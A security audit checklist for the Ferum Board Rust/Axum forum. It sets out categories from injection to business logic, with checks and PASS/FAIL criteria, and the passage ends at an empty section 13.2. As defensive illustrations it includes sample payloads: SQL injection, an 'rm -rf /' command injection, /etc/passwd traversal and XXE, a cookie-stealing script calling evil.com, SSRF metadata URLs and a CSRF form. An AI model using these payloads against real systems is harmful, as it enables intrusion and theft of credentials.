# Security Audit Checklist — Ferum Board

> This document defines each vulnerability category, how to identify it, and explicit
> PASS/FAIL criteria for the Ferum Board Rust + Axum codebase.
>
> **Usage:** Run through each section before every release or when adding a new feature
> in a related area. Check `[x]` when verified and result is PASS.

---

## Table of Contents

1. [Injection](#1-injection)
2. [XSS — Cross-Site Scripting](#2-xss--cross-site-scripting)
3. [Broken Authentication](#3-broken-authentication)
4. [Broken Access Control](#4-broken-access-control)
5. [Sensitive Data Storage](#5-sensitive-data-storage)
6. [Security Misconfiguration](#6-security-misconfiguration)
7. [Software and Data Integrity Failures](#7-software-and-data-integrity-failures)
8. [SSRF — Server-Side Request Forgery](#8-ssrf--server-side-request-forgery)
9. [CSRF — Cross-Site Request Forgery](#9-csrf--cross-site-request-forgery)
10. [XXE — XML External Entities](#10-xxe--xml-external-entities)
11. [Insufficient Logging & Monitoring](#11-insufficient-logging--monitoring)
12. [Unrestricted File Upload](#12-unrestricted-file-upload)
13. [Business Logic Flaws](#13-business-logic-flaws)
14. [Secrets Management](#14-secrets-management)
15. [Insufficient Transport Layer Protection](#15-insufficient-transport-layer-protection)
16. [Information Exposure](#16-information-exposure)

---

## 1. Injection

### 1.1 SQL Injection

**What it is:**
An attacker injects SQL code into user input to manipulate database queries — reading
unauthorized data, bypassing authentication, or dropping tables.

```sql
-- Input: username = "admin' OR '1'='1"
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
-- Result: returns all users, authentication bypassed
```

**Where it appears:** Anywhere user input flows into a database query.

**How to check:**

- [ ] Grep all of `ferum-infrastructure/` for `raw_sql`, `format!("SELECT`, `query_builder.raw`
- [ ] No string interpolation in queries — use Sea-ORM entity/column API only
- [ ] All filter/search parameters go through `.filter(Column::eq(value))` or bind params

**PASS:** 100% of queries use the Sea-ORM ORM API or parameterized binds. Zero raw string concatenation with user input.

**FAIL:** Any `format!("...{user_input}...")` found feeding into a database call.

---

### 1.2 OS Command Injection

**What it is:**
The app calls a shell command with user-supplied input — an attacker appends additional commands.

```bash
# If filename comes from user: "img.png; rm -rf /"
convert img.png; rm -rf /
```

**Where it appears:** File/image processing, external tool calls, plugin execution.

**How to check:**

- [ ] Grep for `std::process::Command`, `Command::new()` across the entire codebase
- [ ] Every argument passed to `Command` must be hardcoded or come from config — never directly from user input
- [ ] Plugin Tier 2 (boa_engine JS sandbox) does not expose OS command execution

**PASS:** No `Command::new()` receives arguments derived from user input. Plugin sandbox does not expose OS API.

**FAIL:** A user-controlled string is passed to `Command::arg()`.

---

### 1.3 Path Traversal

**What it is:**
An attacker uses `../` in a file path to escape the allowed directory and access system files.

```
GET /files/../../../etc/passwd
GET /themes/../../backend/crates/ferum-web/src/config.rs
```

**Where it appears:** File serving, theme upload, plugin install path, avatar/cover serving.

**How to check:**

- [ ] Every path built from user input goes through `canonicalize()` and is verified to remain within the allowed prefix
- [ ] Theme slug contains only `^[a-z0-9-]+$` — no `/`, `\`, or `..`
- [ ] Plugin `install_path` is not taken directly from the request
- [ ] `/files/{*key}` route: `is_safe_key` runs before anything else. `public_url` is string concatenation, so a key containing `..` normalises in the browser to a different path — and in the path-style URLs S3 and GCS both use, a different path is a different **bucket**
- [ ] Upload handler rejects path traversal within archive entries
- [ ] `/themes/**` reaches `ServeDir` only via `theme_asset_guard` (`routings/mod.rs`), which allows exactly `{slug}/assets/**`. A bare `ServeDir` over the themes directory also served `{slug}/templates/*.html` and `theme.json`, publishing raw Tera source to anonymous callers
- [ ] `/plugins/{slug}/assets/{*path}` is a dedicated handler, not a `ServeDir` over the plugins directory — manifests, hook scripts and plugin configs must stay unreachable

**PASS:** All paths strip or reject `..` and have their prefix verified after canonicalization.

**FAIL:** User can control any part of a file path without sanitization.

---

## 2. XSS — Cross-Site Scripting

### 2.1 Stored XSS

**What it is:**
A malicious script is saved to the database and later rendered for every user who views it.

```html
<!-- User posts: -->
<script>
  fetch("https://evil.com?c=" + document.cookie);
</script>
<!-- Everyone who reads that thread has their cookie stolen -->
```

**Where it appears:** Post content, thread title, bio, display name — anything stored in DB then rendered.

**How to check:**

- [ ] `content_html` is sanitized through `ammonia` before saving — not at render time
- [ ] Ammonia config whitelists only safe tags: `<b>`, `<i>`, `<a>`, `<code>`, `<pre>`, `<blockquote>`
- [ ] `display_name`, `bio`, `website` are escaped in Tera (`{{ value }}` not `{{ value | safe }}`)
- [ ] Thread title does not use the `| safe` filter in any template
- [ ] Tag name/color is escaped when rendered

**PASS:** All user-generated content goes through ammonia before being stored. No Tera template uses `| safe` on any user-sourced field.

**FAIL:** `{{ field | safe }}` found on a field that can contain user input. Or ammonia is bypassed.

---

### 2.2 Reflected XSS

**What it is:**
Input from the URL or request is echoed back into the HTML response without escaping.

```
https://forum.com/search?q=<script>alert(document.cookie)</script>
```

**Where it appears:** Search page, error page, redirect URL parameter.

**How to check:**

- [ ] Search query `q` is escaped when rendered: `{{ query }}` not `{{ query | safe }}`
- [ ] Error messages from query params do not render raw HTML
- [ ] `redirect_to` param is not injected into `<script>` blocks or meta refresh `href`

**PASS:** All query params rendered in HTML go through Tera auto-escaping.

**FAIL:** A query param renders with `| safe` or via string concatenation in a template.

---

### 2.3 DOM-Based XSS

**What it is:**
Client-side JavaScript injects user-controlled data into the DOM without going through the server.

```js
// Vulnerable:
document.getElementById("msg").innerHTML = location.hash.slice(1);
// URL: /forum#<img onerror=alert(1) src=x>
```

**Where it appears:** `ferum-page-*.js`, Svelte widgets, Alpine.js expressions.

**How to check:**

- [ ] Grep for `innerHTML`, `outerHTML`, `document.write`, `insertAdjacentHTML` in `frontend/static/js/`
- [ ] Svelte widgets use `{@html}` only with content already sanitized server-side
- [ ] Alpine.js `x-html` is not used with user input
- [ ] `location.hash`, `location.search`, `document.referrer` are not injected into the DOM directly

**PASS:** No `innerHTML` assigned a user-controlled value. `{@html}` only used with server-sanitized HTML.

**FAIL:** `innerHTML = userInput` or `{@html rawUserContent}` found in client code.

---

## 3. Broken Authentication

### 3.1 Improper Authentication

**What it is:**
Flawed auth logic: verification skipped, token not properly validated, null/empty credentials accepted.

**How to check:**

- [ ] JWT verification always checks signature, expiry, and `iss`/`aud` claims
- [ ] Middleware does not let requests proceed when a token is invalid (only sets `None` for optional auth)
- [ ] Endpoints requiring auth (`RequireAuth`) reject immediately when `Option<AuthUser>` is `None`
- [ ] Password reset token: single-use (invalidated after consumption), 1-hour TTL
- [ ] Email verification token: single-use, reasonable TTL
- [ ] Account lockout after 5 failed login attempts (`failed_login_count` + `locked_until` fields)

**PASS:** JWT validation is complete. Tokens are single-use and enforced. Lockout works correctly.

**FAIL:** Verification can be skipped, or a token can be reused after being consumed.

---

### 3.2 Expose Session Token

**What it is:**
JWT or refresh token leaks outside its intended scope.

**How to check:**

- [ ] JWT cookie is set with `HttpOnly`, `Secure` (production), `SameSite=Lax`
- [ ] Token never appears in a URL query parameter
- [ ] Token is never logged in access logs or structured logs
- [ ] Login response body does not return the raw JWT string (only user info)
- [ ] No Tera template has a `{{ token }}` or `{{ jwt }}` variable
- [ ] JavaScript cannot read the auth cookie (`HttpOnly` enforced)

**PASS:** Token only exists in an HttpOnly cookie. No other location where it can be read by JS or a third party.

**FAIL:** Token found in URL, logs, JSON response body, or a non-HttpOnly cookie.

---

### 3.3 User Enumeration

**What it is:**
The app distinguishes "user does not exist" from "wrong password" — attackers use the difference to enumerate valid usernames.

**How to check:**

- [ ] Login response: same message `"Invalid email or password"` for both cases
- [ ] Forgot password response: always `"If this email exists, you will receive a reset link"` — does not reveal whether the email exists
- [ ] Login timing: both cases take equivalent time (run bcrypt verify against a dummy hash when user does not exist)
- [ ] Registration: does not allow enumeration of existing emails in a distinguishable way

**PASS:** Response message and timing are indistinguishable between "user not found" and "wrong password".

**FAIL:** Different response for "user not found" vs "wrong password". Timing attack is feasible.

---

## 4. Broken Access Control

### 4.1 Missing Function Level Access Control

**What it is:**
A sensitive endpoint is hidden in the UI but has no real guard on the backend.

**How to check:**

- [ ] Every `/api/admin/*` route requires an `admin.*` permission — not just an `is_admin` flag
- [ ] Every `/api/mod/*` route checks `moderation.*` permission
- [ ] Permission checks live in the use case layer — not only in middleware or the router
- [ ] `has_perm()` or `has_perm_in()` is called before every state mutation in a use case
- [ ] Deleting/editing another user's post checks `post.delete_any` / `post.edit_any`, not just user inequality

**PASS:** Every endpoint has an explicit permission check in its use case. No endpoint relies solely on UI hiding.

**FAIL:** An admin/mod endpoint is accessible without a backend permission check.

---

### 4.2 Insecure Direct Object Reference (IDOR)

**What it is:**
The app uses a user-supplied ID to access a resource without verifying the user has rights to that resource.

```
PATCH /api/posts/789    # another user's post → must fail
GET  /api/bookmarks/456 # another user's bookmark → must fail
```

**How to check:**

- [ ] Edit post: verify `post.author_id == current_user.id` BEFORE updating
- [ ] Delete own post: verify ownership before soft delete
- [ ] Bookmark list: query filtered by `user_id = current_user.id` — not by a bookmark ID from the URL
- [ ] Notifications: query filtered by `user_id = current_user.id`
- [ ] Follow/unfollow: validate target user exists; cannot unfollow someone not followed
- [ ] Thread thumbnail: only thread author or a moderator can upload/remove

**PASS:** Every resource access verifies ownership or permission before returning data or executing the action.

**FAIL:** Another user's resource is accessible by simply changing the ID in the request.

---

## 5. Sensitive Data Storage

### 5.1 Plain Text Storage of Password

**What it is:**
Passwords stored as plain text, base64, or a weak hash — if the DB is dumped, credentials are immediately exposed.

**How to check:**

- [ ] `password_hash` column contains bcrypt hashes (starting with `$2b$`)
- [ ] Only `BcryptPasswordHasher` in `ferum-infrastructure` calls `bcrypt::hash`
- [ ] No other columns named `password`, `pass`, or `pwd` exist in the schema
- [ ] Passwords are never logged anywhere

**PASS:** `password_hash` uses bcrypt cost 12. No raw password stored in DB or logs.

**FAIL:** Plain text or a weak hash (MD5/SHA1) found in the DB or logs.

---

### 5.2 Weak Algorithm Use

**What it is:**
Using outdated cryptographic algorithms: MD5/SHA1 for passwords; DES/RC4 for encryption.

**How to check:**

- [ ] Passwords: bcrypt cost 12 — not MD5/SHA1/plain SHA256
- [ ] JWT: HS256 with a strong secret (≥ 256 bits of entropy) — `none` algorithm must be rejected
- [ ] Random tokens (password reset, email verify): `OsRng` or `uuid::Uuid::new_v4()` — not `rand::random()`
- [ ] Webhook HMAC signature: SHA-256 — not MD5
- [ ] No custom cryptography implementation

**PASS:** bcrypt for passwords, HS256 for JWT, OsRng for randomness, HMAC-SHA256 for webhooks.

**FAIL:** MD5/SHA1/DES found in any security-critical context.

---

### 5.3 Insecure Randomness — and Unforgeable Tokens

**What it is:**
Using a predictable PRNG instead of a CSPRNG to generate secret values — an attacker
can predict the next token.

> **Read this before checking anything below.** Password reset and email verification
> in this codebase are **signed JWTs**, not stored random strings. `jwt_token_service.rs`
> mints them with a `purpose` claim (`"password_reset"`, the verification purpose) and
> HS256; there is no `reset_token` column anywhere, and `users` has none. So
> "is the token generated from `OsRng`?" is the wrong question — unguessability comes
> from the HMAC, not from entropy in the payload. An earlier revision of this section
> asked for `Uuid::new_v4()` here, which describes a design this project does not have
> and would send an auditor looking for a column that does not exist.

**How to check — token unforgeability (the JWT path):**

- [ ] Reset and verification tokens are verified with `Algorithm::HS256` and a
      `Validation` that checks expiry — not decoded without verification
- [ ] The `purpose` claim is compared against the expected value, so a refresh token
      cannot be replayed as a password reset (`verify_email_token` takes
      `expected_purpose` for exactly this reason)
- [ ] `JWT_SECRET` is ≥ 256 bits of real entropy — the signature is the *only* thing
      making these tokens unguessable, so a weak secret defeats the whole scheme
- [ ] Single use is enforced by `cache.set_nx("used_token:{token}", …)` with a TTL
      that **outlives the token** (`PASSWORD_RESET_TOKEN_TTL_SECS + 60`). A shorter
      TTL would let a still-valid token be replayed after the marker expired

> **Single use depends on the cache, and that is a deployment constraint, not just a
> code one.** With no `REDIS_URL` the cache is `InMemoryCacheService`, which is
> per-process. Two app instances behind a load balancer therefore have two separate
> "used token" sets, and a reset token can be redeemed once per instance. Verify
> `REDIS_URL` is set on any deployment running more than one instance.

**How to check — actual randomness (what genuinely is random here):**

- [ ] Encryption nonces: `XNonce::try_generate()` (OS RNG), and `try_` rather than the
      panicking form, because it runs on a request path
- [ ] Webhook secret, when generated rather than operator-supplied: OS entropy
- [ ] CAS storage keys are SHA-256 **of the content** — deliberately not random, which
      is what makes deduplication work. Do not "fix" this to a UUID
- [ ] Grep for `rand::random()`, `SystemTime::now()`, or a counter used as a token seed

**PASS:** Reset/verification tokens are HS256-signed with a purpose claim, an enforced
expiry, and a single-use marker outliving the token. Everything genuinely random comes
from an OS entropy source.

**FAIL:** A token is accepted without signature verification, a purpose claim is not
checked, the single-use marker expires before the token does, or any secret is derived
from a predictable source.

---

### 5.4 Data-at-Rest Classification (all sensitive columns, not just passwords)

**What it is:**
Sections 5.1–5.3 only check password hashing, algorithm strength, and randomness. They do
**not** verify that every other sensitive column in the schema is handled correctly. A column
that should be hashed or encrypted but is stored as plain text is invisible to 5.1–5.3 and
will silently pass the rest of the audit.

**Where it appears:** Any table holding third-party tokens, webhook secrets, PII, or
anything a support engineer or a leaked DB dump should not be able to read directly.

**How to check:**

- [ ] Inventory every table/column in `migration/` and `entity/` (Sea-ORM). For each column,
      assign one classification:
  - **Must be hashed** (one-way, never reversed): passwords, verification-only API keys
  - **Must be encrypted at rest** (needs to be reversed/used later): OAuth/refresh tokens,
    payment provider tokens, outbound API keys, anything a support team should not read
    directly from a DB dump
  - **Must be masked/truncated** in logs and API responses but may stay plaintext in DB:
    email, IP address, phone number
  - **Fine as plaintext**: display name, public bio, thread content
- [ ] For every column classified "must be hashed": confirm it is actually hashed today, not
      plaintext
- [ ] For every column classified "must be encrypted": confirm the algorithm (must be a
      vetted scheme, e.g. AES-256-GCM — reject XOR, ECB mode, base64-only "encryption"), and
      confirm the encryption key is stored **outside** the database (env var / KMS / secrets
      manager), never in the same table or a sibling config table
- [ ] If a field was migrated from plaintext to encrypted/hashed, check for leftover
      plaintext copies in old migrations, `audit_logs`, or backup/export code paths
- [ ] IP addresses stored for login/audit logs: check retention — kept indefinitely, or
      rotated/anonymized after N days per the project's stated privacy policy
- [ ] Webhook `secret`, plugin capability tokens, and SMTP credentials that live in the
      database (not just `.env`) are encrypted at rest, not plaintext columns

**Output:** a table — `column | table | classification | current state (plaintext / hashed /
encrypted) | verdict (PASS/FAIL) | recommended fix`.

**PASS:** every column requiring hashing is hashed; every column requiring encryption uses a
vetted algorithm with the key stored outside the database table it protects.

**FAIL:** any column that should be hashed/encrypted is found as plaintext, or the encryption
key sits in the same DB/table as the encrypted data it protects.

---

## 6. Security Misconfiguration

### 6.1 Disable Security Features

**What it is:**
Security headers turned off, CORS too permissive, cookie flags missing.

**How to check:**

- [ ] Responses include all required headers: `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy`
- [ ] CORS `Access-Control-Allow-Origin` is not `*` on authenticated endpoints
- [ ] Cookie flags: `HttpOnly`, `Secure` (when `APP_URL` is https), `SameSite=Lax`
- [ ] HSTS header set (typically via Nginx — verify nginx config)

**CSP — `'unsafe-eval'` is present on purpose, so do not check for its absence.**
An earlier revision of this section required "no `unsafe-eval`", which fails a
deliberate decision documented at the top of `security_headers.rs`: Alpine.js compiles
every `x-data` / `x-show` / `x-for` expression at runtime through the `Function`
constructor, and without it the browser blocks every Alpine directive on both the admin
panel and the themes. Inline `<script>` and `on*=` attributes stay forbidden — only
Alpine's evaluator is permitted.

Check the policy against what it is supposed to allow, not against a generic ideal:

- [ ] `script-src 'self' 'unsafe-eval'` — and **nothing else**. No `'unsafe-inline'`,
      no host allowlist, no `data:`
- [ ] `connect-src 'self'` — never widened. See the rule below
- [ ] `style-src 'self' 'unsafe-inline'` — Bootstrap injects inline styles at runtime
- [ ] `frame-ancestors 'none'`, `base-uri 'self'`, `form-action 'self'` all present
- [ ] `img-src` is **not** a constant: `startup.rs` appends the origin of
      `StorageService::public_url`, so an S3/GCS/R2/CDN install serves
      `img-src 'self' data: blob: https://that-origin`. A hardcoded `img-src`
      silently breaks every non-same-origin upload configuration — the upload
      succeeds, the row is written, and the browser then refuses to load it, with
      nothing in the server logs
- [ ] **Only `img-src` widens.** If a bucket origin has leaked into `script-src` or
      `connect-src`, that is a real finding: a bucket holds user-uploaded bytes, and
      letting it serve scripts to this origin turns an upload-validation bug into
      code execution

**PASS:** All security headers present. CSP matches the policy above exactly, with the
storage origin appearing in `img-src` and nowhere else. CORS restricted to the correct
origin. All cookie flags set.

**FAIL:** Any security header missing. `Allow-Origin: *` on an authenticated endpoint.
A storage or CDN origin present in `script-src` or `connect-src`. `img-src` hardcoded
while an object-store backend is configured.

---

### 6.2 Debug Features Enabled

**What it is:**
Debug mode, verbose errors, or development endpoints left active in production.

**How to check:**

- [ ] Stack traces never appear in HTTP responses (verify `AppError` / `HandlerError` mapping)
- [ ] `RUST_LOG` in production is `info` or `warn` — not `debug` or `trace`
- [ ] No `/debug`, `/internal`, or `/dev` routes in the production binary
- [ ] `GET /health` and `/health/live` return only `{"status":"ok"}` — they check no dependencies by design, so they cannot leak one
- [ ] `GET /health/ready` returns only per-dependency `ok`/`unreachable` — never a connection string, driver error, or host name
- [ ] Error responses only return `{ "error": { "code": "...", "message": "..." } }` — no `details.backtrace`

**PASS:** Production mode leaks no debug information. Health endpoint is minimal.

**FAIL:** Stack trace, SQL error, or file path appears in any production response.

---

## 7. Software and Data Integrity Failures

### 7.1 Using Components from Untrusted Sources

**What it is:**
Dependencies from unverified sources, external CDN assets without integrity checks, unverified plugin packages.

**How to check:**

- [ ] `Cargo.lock` is committed — verify checksums have not changed unexpectedly
- [ ] Plugin `.fpkg` uploads: manifest structure is validated before installation
- [ ] `cargo audit` passes — no known CVE in the dependency tree

**Front-end assets are vendored, not loaded from a CDN — so SRI does not apply.**
Bootstrap 5.3.3, FontAwesome 6.7.2 and Alpine.js all live under `frontend/static/`
and are served same-origin. An earlier revision of this section asked for
`integrity="sha384-…"` attributes; there are no external `<script>`/`<link>` tags to
put them on, so that check could only ever be ticked by inventing something. The
CSP's `default-src 'self'` enforces the same property more strongly — a third-party
script tag would simply be blocked.

What to check instead:

- [ ] No `<script src>` or `<link href>` in `frontend/` points at an external host —
      this is the invariant SRI would otherwise be protecting. Grep for `//cdn`,
      `jsdelivr`, `cdnjs`, `unpkg`
- [ ] If a CDN asset is ever introduced, it carries `integrity` + `crossorigin`, and
      the CSP is widened for that origin in the **same** change — a script from an
      origin `script-src` does not list is dead code that fails silently in the
      browser console
- [ ] Vendored library versions are recorded somewhere an upgrade will be noticed
      (`CLAUDE.md` names them today), since a vendored file receives no dependency
      alerts of any kind

**PASS:** `cargo audit` is clean. No external asset origins. Plugins are validated
before install.

**FAIL:** `cargo audit` reports a high/critical advisory. An external asset is loaded
without an integrity hash, or without the matching CSP change.

---

### 7.2 Mass Assignment

**What it is:**
Binding the entire JSON body to a DB model without filtering fields — an attacker adds privileged fields.

```json
PATCH /api/users/me
{"display_name": "hacker", "trust_level": "leader", "is_banned": false}
```

**How to check:**

- [ ] `UpdateProfileRequest` only contains allowed fields: `display_name`, `bio`, `website`
- [ ] `trust_level`, `is_banned`, `is_admin`, `role` do not appear in any user-facing request struct
- [ ] DB update explicitly sets each column — no `set_from_json()` or equivalent
- [ ] Plugin config update: only updates the `config` field — `status`, `tier`, `granted_capabilities` are never taken from the user request

**PASS:** Every request struct exposes only the necessary fields. DB updates name each column explicitly.

**FAIL:** A request struct exposes privilege-escalating fields. `set_from_json` used with the full request body.

---

### 7.3 Deserialization of Untrusted Data

**What it is:**
Deserializing complex data from user input without validation — an attacker crafts a payload to exploit type confusion or achieve RCE.

**How to check:**

- [ ] Plugin manifest JSON: schema is strictly validated before deserializing into a struct
- [ ] Webhook payload JSONB: serialized from known structs only — not deserialized then re-executed
- [ ] Cookie values (beyond JWT): if serialized/deserialized, use typed structs not raw `Value`
- [ ] `bincode`/`serde` is not used with untrusted binary data from users

**PASS:** All deserialization uses typed structs with validation. No exec-from-data pattern.

**FAIL:** Untrusted data is deserialized into a dynamic type and then executed.

---

### 7.4 Using Known Vulnerable Components

**How to check:**

- [ ] `cargo audit` — zero high/critical advisories
- [ ] `npm audit` in `frontend/client-widgets/` — zero high/critical findings
- [ ] Dependencies with a CVE are updated within 7 days of the advisory being published

**PASS:** `cargo audit` and `npm audit` report no findings of severity ≥ high.

---

## 8. SSRF — Server-Side Request Forgery

**What it is:**
The app fetches a URL supplied by the user — an attacker uses it to probe the internal network or cloud metadata endpoints.

```
POST /api/webhooks {"url": "http://169.254.169.254/latest/meta-data/"}
POST /api/webhooks {"url": "http://localhost:5432"}
POST /api/admin/plugins {"url": "file:///etc/passwd"}
```

**Where it appears:** Webhook URL, plugin asset URL, any fetch-by-URL feature.

**How to check:**

- [ ] Webhook URL validation: reject `localhost`, `127.x.x.x`, `10.x`, `172.16-31.x`, `192.168.x`, `169.254.x`, `::1`
- [ ] Only `https://` scheme is accepted for webhook URLs — reject `file://`, `ftp://`, `gopher://`
- [ ] Every outbound request to a user/admin/plugin-supplied URL goes through `ferum-infrastructure/src/network_utils.rs::build_pinned_client()` — it resolves DNS, rejects private/reserved IPs (RFC-1918, loopback, link-local, CGNAT 100.64/10, IPv6 ULA/link-local) via `ferum_domain::net::is_private_ip`, and then **pins the request to the addresses just validated**
- [ ] No call site validates a URL and then builds its own `reqwest::Client` — that reopens the DNS-rebinding TOCTOU window `build_pinned_client` exists to close, which is why `resolve_and_validate` is deliberately not public
- [ ] Redirect following stays disabled on that client. `resolve_to_addrs` pins only the original host, so a 302 to `http://169.254.169.254/` would be resolved with no validation at all
- [ ] Plugins cannot call arbitrary URLs from the sandbox: `capabilities.http_allowlist` must be non-empty **and** admin-granted, and the runtime intersects the two

**PASS:** Webhook URLs with private/loopback IPs are blocked. Plugin outbound HTTP is allowlisted by host and pinned to a validated address.

**FAIL:** A webhook can be sent to `localhost` or `169.254.169.254`.

---

## 9. CSRF — Cross-Site Request Forgery

**What it is:**
A malicious site tricks a logged-in user's browser into sending a request to the forum — the browser automatically attaches the auth cookie.

```html
<!-- evil.com -->
<form method="POST" action="https://forum.com/api/threads" id="f">
  <input name="title" value="spam" />
</form>
<script>
  document.getElementById("f").submit();
</script>
```

> ### There is deliberately no CSRF token in this codebase
>
> **Do not check for one, and do not add one to "fix" this section.** Earlier
> revisions of this document required a `X-CSRF-Token` header and a per-session
> token. None of that was ever implemented — grep the repository and the only file
> containing the string `csrf_token` is *this document*. An auditor working from the
> old text finds a FAIL, goes looking for the missing middleware, and the code they
> end up touching is the protection that actually works.
>
> The real control is two layers, and the second only matters because of the first:
>
> 1. **`SameSite=Lax` on the auth cookie** (`utils.rs`) — the browser will not attach
>    it to a cross-site POST/PATCH/DELETE at all, so a forged state-changing request
>    arrives unauthenticated and fails on its own.
> 2. **`Origin` allowlist** (`middleware/csrf.rs`) — any non-GET request whose
>    `Origin` header is present and not in the allowlist is rejected with 403.
>
> **A request with no `Origin` header is allowed through, and that is correct.** Such
> requests come from server-to-server callers, curl, and old browsers — none of which
> can be made to attach another user's cookie cross-site. Modern browsers *do* send
> `Origin` on cross-origin form POSTs, which is the case that matters.

**How to check:**

- [ ] Auth cookie carries `HttpOnly; SameSite=Lax` (and `Secure` when `APP_URL` is
      https). `tests/web/` asserts the attribute — **do not relax that test**
- [ ] `csrf_origin_check` is mounted on every state-changing router, and skips only
      `GET`/`HEAD`/`OPTIONS`
- [ ] The allowlist is `APP_URL` + `CORS_ORIGINS`, built at startup — and `localhost`
      entries are dropped once `APP_URL` is non-local, so a production deploy that
      never set `CORS_ORIGINS` does not still trust the dev origin
- [ ] Origin comparison is exact string equality against the allowlist — not
      `starts_with`, not a substring test (`https://evil-app.com` must not match an
      allowlisted `https://app.com`)
- [ ] `GET /api/notifications/stream` (SSE) has no side effects — read-only
- [ ] No state-changing operation is reachable by `GET`

**The condition that invalidates this whole scheme:**

- [ ] The auth cookie is **not** `SameSite=None`. If it ever becomes so, layer 1
      disappears, the `Origin` check becomes the only defence, and a real
      per-session token becomes mandatory — at which point this section must be
      rewritten rather than re-ticked

**PASS:** `SameSite=Lax` on the auth cookie, `Origin` allowlist enforced on every
non-GET route with exact matching, no state-changing GETs.

**FAIL:** Cookie missing `SameSite`, or weakened to `None` with no token added. Origin
matched by prefix or substring. A state-changing operation reachable by `GET`.

---

## 10. XXE — XML External Entities

**What it is:**
An XML parser with external entity processing enabled allows reading system files or performing SSRF.

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>
```

**Where it appears:** SVG upload (SVG is XML), theme package XML config, feed import.

**How to check:**

- [ ] SVG uploads: parsed with external entities disabled, or sanitized with a dedicated library
- [ ] Theme ZIP does not contain any XML that is parsed — only HTML templates and JSON config
- [ ] If RSS/Atom import exists: parser configured with `expand_entities: false`
- [ ] Grep for XML parser usage across the entire codebase

**PASS:** No XML parser receiving user input has external entity processing enabled.

**FAIL:** SVG is parsed as XML with DTD processing enabled.

---

## 11. Insufficient Logging & Monitoring

**What it is:**
Missing logs for important security events — a breach occurs without being detected or traceable after the fact.

**How to check:**

- [ ] All failed login attempts are logged (email, IP, timestamp)
- [ ] Account lockout events are logged
- [ ] Permission denied events are logged (user_id, endpoint, required permission)
- [ ] All admin actions are written to `audit_logs` — verify every admin use case inserts a row
- [ ] All moderator actions are logged (warn, ban, resolve report)
- [ ] File uploads are logged (user_id, file key, size, content_type)
- [ ] Token generation and consumption are logged (password reset, email verify)
- [ ] Structured logs include a `request_id` for correlation
- [ ] Logs do not contain sensitive data (passwords, raw token values)

**PASS:** All security events are logged. Audit log is complete for all admin/mod actions.

**FAIL:** Failed logins are not logged. Admin actions do not appear in `audit_logs`.

---

## 12. Unrestricted File Upload

**What it is:**
The app checks only the file extension or the `Content-Type` header (both forgeable by the user) instead of the actual magic bytes.

**Where it appears:** Avatar, cover image, thread thumbnail, theme upload, plugin upload.

**How to check:**

**Images — every upload path, not just the obvious ones:**

- [ ] Magic bytes verified (JPEG `FF D8 FF`, PNG `89 50 4E 47`, GIF `GIF8[79]a`,
      WebP `RIFF????WEBP`), **paired with** the declared content type. There are seven
      such paths — avatar, cover, thread thumbnail, product media, plugin media,
      favicon, post attachment — and the check is written out at each one, so a new
      upload feature can silently omit it
- [ ] `validate_image_magic` keeps its length guard. The WebP branch slices
      `data[8..12]`, so without it a 4-byte `RIFF` upload panics the handler
- [ ] Size limits enforced server-side from the `MAX_*_BYTES` constants
- [ ] SVG stays out of both allowlists — it is XML and can carry script (see §10)

**Archives — the slug is as dangerous as the entry paths:**

- [ ] Plugin `.fpkg`: `enclosed_name()`, explicit `ParentDir`/`RootDir` rejection,
      `starts_with` containment, file-count cap, and a decompression bound taken from
      the *remaining budget* rather than the entry's declared `uncompressed_size`,
      which is attacker-controlled
- [ ] **The directory name is validated by a whitelist before it is joined.** Plugin
      IDs go through `validate_plugin_id`; theme slugs through `check_theme_slug`.
      A blocklist is not enough: the theme guard rejected `..`, `/` and `\` and still
      let `""` and `"."` through, both of which collapse `themes_dir.join(slug)` back
      to `themes_dir`
- [ ] **`starts_with(&target_dir)` proves nothing if `target_dir` is itself
      attacker-named.** It passed in every one of those cases. Validate the root
      first; the containment check only covers entry paths
- [ ] Theme upload refuses `DEFAULT_THEME_SLUG`. `templates/base.html` is mandatory
      in the archive, so an upload under that slug overwrites the root of every
      inheritance chain — and the likeliest cause is an admin editing the shipped
      theme and re-uploading it, not an attack
- [ ] Extraction propagates I/O errors instead of `.ok()` — a truncated read that
      still reports success writes a broken template and surfaces later as an
      unexplained Tera error

> **The theme extension blocklist is a build-step guard, not a security control.**
> `["svelte","ts","tsx","jsx","vue"]` are source formats nothing here compiles. Plain
> `.js` is allowed, served same-origin from `/themes/{slug}/assets/**`, and executes
> under `script-src 'self'`. An admin-uploaded theme can ship arbitrary client-side
> code and always could — do not read this list as preventing that, and do not add
> `.php`/`.rb`/`.py` expecting it to mean something (there is no interpreter).

**Serving:**

- [ ] `/files/` serves the `Content-Type` from the DB row, with
      `Content-Disposition: attachment` — never a type derived from the key's
      extension. (`content_type_for_path` in `uploads.rs` is for *plugin assets*,
      which are files on disk with no DB row; that one has no alternative)
- [ ] `is_safe_key` runs before anything else on `/files/`
- [ ] Post attachments carry a per-account rolling quota, since the rate limiter keys
      on IP and caps burst rate rather than total stored bytes

> **"Served from a separate CDN subdomain" is not achievable on the default
> deployment, and that is accepted.** Database storage serves uploads same-origin from
> `/files/`. The compensating controls are `Content-Disposition: attachment`,
> `X-Content-Type-Options: nosniff`, CSP `default-src 'self'`, and CAS keys that are a
> hash of the content. Check those instead of checking for a subdomain that only
> exists under an object-store backend.

**PASS:** Magic bytes plus declared type on every image path. Archive roots validated
by whitelist before joining, entry paths validated after. Stored files served with the
DB content type and `attachment` disposition.

**FAIL:** Only extension or `Content-Type` header checked. An archive directory name
taken from user input without whitelist validation. A containment check standing in
for root validation.

---

## 13. Business Logic Flaws

### 13.1 Insufficient Validation

**What it is:**
Missing input validation that leads to invalid state in the system.

**How to check:**

- [ ] Thread title: min/max length validated, cannot be empty
- [ ] Post content: cannot be empty, max length enforced
- [ ] Pagination: `page` and `per_page` must be positive; `per_page` has an upper bound (no `per_page=1000000`)
- [ ] Reaction kind: validated against the `like|helpful|insightful|funny` enum — arbitrary strings rejected
- [ ] Category `parent_id`: circular hierarchy not allowed (A → B → A)
- [ ] Role position: non-negative integer
- [ ] Webhook URL: valid URL format, cannot be empty
- [ ] Report reason: cannot be empty, max length enforced

**PASS:** All inputs have explicit validation. Invalid input returns 400 with a specific message.

**FAIL:** Empty string, negative value, or out-of-enum value can be submitted without rejection.

---

### 13.2 Logical Error

**What it is:**
Incorrect flow logic that produces unintended behavior even without a technical error.

**How to check:**

